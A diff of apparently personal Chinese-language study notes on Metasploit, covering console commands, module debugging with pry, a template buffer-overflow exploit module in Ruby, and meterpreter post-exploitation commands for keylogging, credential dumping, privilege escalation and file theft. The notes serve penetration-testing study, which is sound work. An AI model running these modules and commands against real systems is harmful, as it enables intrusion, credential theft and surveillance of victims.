@@ -468,86 +468,136 @@
         * 启动msfconsole并查看数据库连接状态
             > msfconsole
             > db_status
+* MSF命令
+    * `use <ruby脚本路径>`: 使用模块. 路径是相对于`/use/share/metasploit-framework/modules/exploits`的. 
+        * `back`: 退出当前模块
+        * `edit exploit/zbh1.rb`: 编辑自定义的ruby脚本
+        * `show targets`: 显示目标平台(操作系统)
+        * `set target 0`: 选择第0项作为target
+        * `show payloads`: 显示可用的shellcode
+        * `show options`: 显示配置信息
+        * exp常见配置选项: 
+            * `set payload <payload路径>`: 设置载荷
+                * `windows/exec`: 这个shellcode可执行任意命令
+            * `set rhost <目标ip地址>`: 
+            * `set rport <目标端口>`: 
+            * `set cmd calc`: 配置shellcode待执行的命令为'calc'程序
+            * `set exitfunc seh`: 以seh退出程序
+        * `exploit`: 发送测试数据, 执行攻击. 
+            * `-j`: 
+        * `setg loglevel 3`: 设置日志级别为3(可在`~/.msf4/logs/framework.log`中看到详细的错误跟踪)
+        * `reload_lib <xxx/xxx.rb>`: 根据文件路径重载某ruby文件
+    * `show exploits`: 列出可用EXP模块(包括自己添加的模块)
+    * `jobs`: 列出任务 
+        * `-k 2-6,7,8,11..15`: 停止任务
+
+    * 开发者命令
+        * `edit`: 编辑当前模块或文件
+        * `irb`: 打开交互式shell
+        * `log`: 显示`framework.log`文件内容
+        * `pry`: 在当前模块或框架中打开调试器. 
+        * `reload_lib`: 在当前模块或框架中打开调试器. 
+        * `time`: 
+
+* meterpreter
+    * 账户
+        * `getuid`: 
+        * `run windows/gather/credentials/windows_autologin`: 抓取自动登录的账号密码
+        * `run post/windows/gather/smart_hashdump`: 抓取自动登录的账号密码
+
 * msf模块
-    * `auxiliary`: 
-    * `exploits`: 
-    * `payload`: 
-    * `post`: 
-* 自定义exploit示例
-    ```rb
-    require 'msf/core'
-
-    class Metasploit3 < Msf::Exploit::Remote
-        include Exploit::Remote::Top
-
-        def initialize(info={})
-            super(update_info(info,
-            'Name'           => "Code Example",
-            'Description'    => %q{
-                This is an example of a module using references
-            },
-            'License'        => MSF_LICENSE,
-            'Author'         => [ 'Unknown' ],
-            'References'     =>
-                [
-                [ 'CVE', '2014-9999' ],
-                ['BID', '1234'],
-                ['URL', 'http://example.com/blog.php?id=123']
-                ],
-            'Platform'       => 'win',
-            'Targets'        => [
-                [ 'Windoes 2000', { 'Ret' => 0x77F8948B } ]
-                [ 'Windoes XP SP2', { 'Ret' => 0x7C914393 } ]
-            ],
-            'Payload'        => {
-                'Space' => 200,     # 指定生成的payload的最大字节数
-                'BadChars' => "\x00",
-                # 'DisableNops' => true, # 不用nop雪橇
-                # 'MaxNops' => 100, # 限制nop雪橇最大字节数
-            },
-            'Privileged'     => false,
-            'DisclosureDate' => "Apr 1 2014",
-            'DefaultTarget'  => 0))
-
-            register_options([
-                Optbool.new('<参数名>', [false, "<藐视>" true]), 
-            ])
-        end
-
-        def exploit
-            connect # 根据设置的ip地址和端口, 连接到目标服务器
-            attack_buf = 'a' * 200 + [target['Ret']].pack('V') + payload.encoded # payload在命令中指定; pack('V')是按小端序
-            sock.put(attack_buf)
-            handler
-            disconnect
-            # print_debug('Hello, world')
-            # datastore['<参数名>']
-        end
-
-    end
-    ```
-    * `payload.raw`: 获取payload的原始字节
+    * `auxiliary`: 辅助
+    * `exploits`: 渗透
+    * `payload`: 载荷
+    * `post`: 后渗透
 
 * 自定义模块
-    * 放到`~/.msf4/modules/exploits`下
-    * 进入msfconsole后, 改了模块的话, 执行`reload_all`命令
-    * 进入模块(`use`模块)后可以在编辑后用`reload`重新加载
-* 命令
-    * `show exploits`: 列出可用模块(包括自己添加的模块)
-    * `use <ruby脚本路径>`: 路径是相对于`/use/share/metasploit-framework/modules/exploits`
-    * `edit exploit/zbh1.rb`: 编辑自定义的ruby脚本
-    * `show targets`: 显示目标平台(操作系统)
-    * `set target 0`: 选择第0项作为target
-    * `show payloads`: 显示可用的shellcode
-    * `set payload windows/exec`: 这个shellcode可执行任意命令
-    * `show options`: 显示配置信息
-    * `set rhost <目标ip地址>`: 
-    * `set rport <目标端口>`: 
-    * `set cmd calc`: 配置shellcode待执行的命令为'calc'程序
-    * `set exitfunc seh`: 以seh退出程序
-    * `exploit`: 发送测试数据, 执行攻击
-    * `setg loglevel 3`: 设置日志级别为3(可在`~/.msf4/logs/framework.log`中看到详细的错误跟踪)
-    * `reload_lib <xxx/xxx.rb>`: 根据文件路径重载某ruby文件
+    * 定义和加载
+        * 例如, 在`~/.msf4/modules/exploits`下新建一个`rb`文件, 自定义一个exploit模块
+        * 进入msfconsole后, 改了模块的话, 执行`reload_all`命令重新加载模块. 
+        * 进入模块(`use`模块)后可以在编辑后用`reload`重新加载. 
+        * 如果加载没有成功, 则打印`~/.msf4/logs/framework.log`查看错误日志. 
+    
+    * 调试
+        * 进入`/usr/share/metasploit-framework`, 执行`bundle config unset frozen`
+        * 编辑`Gemfile`, 加一行`gem 'pry-byebug'`
+        * 在要分析的地方加一行`binding.pry`, 即加上一个断点. 
+        * 如果要进入`exploit`函数调试, 则要在其中打断点, 然后`set payload`设置一个载荷, 然后执行`run`. 
+
+        * 指令
+            * `backtrace`: 栈跟踪
+            * `whereami`: 显示当前执行行
+            * `up`: 沿着调用栈回溯到上一个调用的上下文
+            * `down`: 反之
+            * `next`: 执行下一行代码
+            * `finish`: 运行至函数返回
+            * `break`: 列出所有断点
+                * `break SomeClass#run`: 在`SomeClass#run`方法开始处中断.
+                * `break Foo#bar if baz?`: 当`baz?`为true时在`Foo#bar`方法处中断.
+                * `break app/models/user.rb:15`: 在`user.rb`的15行设置断点.
+                * `break 14`: 在当前文件的第14行设置断点
+                * `break --condition 4 x > 2`: 给断点4设置条件.
+                * `break --condition 3`: 移除断点3处的条件.
+                * `break --delete 5`: 删除断点5.
+                * `break --disable-all`: 禁用所有断点
+                * `break --show 2`: 打印断点2的详情 
+    
+    * 自定义exploit示例
+        ```rb
+        require 'msf/core'
+
+        class Metasploit3 < Msf::Exploit::Remote
+            include Exploit::Remote::Tcp
+
+            def initialize(info={})
+                super(update_info(info,
+                'Name'           => "Code Example",
+                'Description'    => %q{
+                    This is an example of a module using references
+                },
+                'License'        => MSF_LICENSE,
+                'Author'         => [ 'Unknown' ],
+                'References'     =>
+                    [
+                    [ 'CVE', '2014-9999' ],
+                    ['BID', '1234'],
+                    ['URL', 'http://example.com/blog.php?id=123']
+                    ],
+                'Platform'       => 'win',
+                'Targets'        => [
+                    [ 'Windoes 2000', { 'Ret' => 0x77F8948B } ],
+                    [ 'Windoes XP SP2', { 'Ret' => 0x7C914393 } ]
+                ],
+                'Payload'        => {
+                    'Space' => 200,     # 指定生成的payload的最大字节数
+                    'BadChars' => "\x00",
+                    # 'DisableNops' => true, # 不用nop雪橇
+                    # 'MaxNops' => 100, # 限制nop雪橇最大字节数
+                },
+                'Privileged'     => false,
+                'DisclosureDate' => "Apr 1 2014",
+                'DefaultTarget'  => 0))
+
+                # 注册选项. 
+                register_options([
+                    OptBool.new('<参数名>', [false, "<描述>", true]), # 后面列表的三个值分别表示是否必选、描述、初始值
+                ])
+            end
+
+            def exploit
+                connect # 根据设置的ip地址和端口, 连接到目标服务器
+                attack_buf = 'a' * 200 + [target['Ret']].pack('V') + payload.encoded # payload在命令中指定; pack('V')是按小端序
+                sock.put(attack_buf)
+                handler
+                disconnect
+                # print_debug('Hello, world')
+                # datastore['<参数名>']
+            end
+
+        end
+        ```
+        * `payload.raw`: 获取payload的原始字节
+    
 * 接口
     * 字符相关
         * `pattern_create(<长度>)`: 生成用于定位的字符串
@@ -568,22 +618,28 @@
     * `-b `: 
     * `-b `: 
     * `--payload windows/exec CMD=calc.exe 0`: 生成载荷, 'windows/exec'是载荷原型, 后面'CMD=calc.exe'是给参数'CMD'设置值. 0表示直接生成字符串, 可以选'C'等, 得到某一编程语言形式的载荷.
-* meterpreter:
-    * metasploit的一类载荷, 如`windows/meterpreter/reverse_tcp`
-    * 命令
-        * `screenshot`: 截屏
-        * `sysinfo`: 获取系统运行的平台
-        * `ps`: 进程列表
-        * `migrate <pid>`: 将会话迁移到某进程空间
-        * `run post/windows/capture/keylog_recorder`: 运行键盘记录器
-        * `use priv`: 运行在特权账号上
-        * `execute -f <文件>`: 在目标机器上运行程序
-        * `route`: 查看路由
-        * `search -d d:\\ -f *.txt`: 在D盘搜索txt文件
-        * `download <文件> <本地目录>`: 从目标机上下载文件到攻击机
-        * `upload <文件> <目标机目录>`: 向目标机上传文件
-        * `portfwd add -l <本机端口> -r <目标ip> -p <目标端口>`: 将目标机端口映射到本机来
-        * ``: 
+
+* 后渗透模块
+    * `meterpreter`:
+        * metasploit的一类载荷, 如`windows/meterpreter/reverse_tcp`
+        * 命令
+            * `screenshot`: 截屏
+            * `sysinfo`: 获取系统运行的平台
+            * `ps`: 进程列表
+            * `migrate <pid>`: 将会话迁移到某进程空间
+            * `run post/windows/capture/keylog_recorder`: 运行键盘记录器
+            * `use priv`: 运行在特权账号上
+            * `execute -f <文件>`: 在目标机器上运行程序
+            * `route`: 查看路由
+            * `search -d d:\\ -f *.txt`: 在D盘搜索txt文件
+            * `download <文件> <本地目录>`: 从目标机上下载文件到攻击机
+            * `upload <文件> <目标机目录>`: 向目标机上传文件
+            * `portfwd add -l <本机端口> -r <目标ip> -p <目标端口>`: 将目标机端口映射到本机来
+            * ``: 
+            * `getuid`: 获取当前用户信息
+            * `getsystem`: 提权
+    * `post/windows/gather/enum_applications`
+
 * 安裝其他gem包: 在`/usr/share/metasploit-framework`下的Gemfile中, 添加`gem '<要安裝的包名>'`, 安装的包如pry, pry-byebug, pwntools等. 
 
 ## immuity dbg
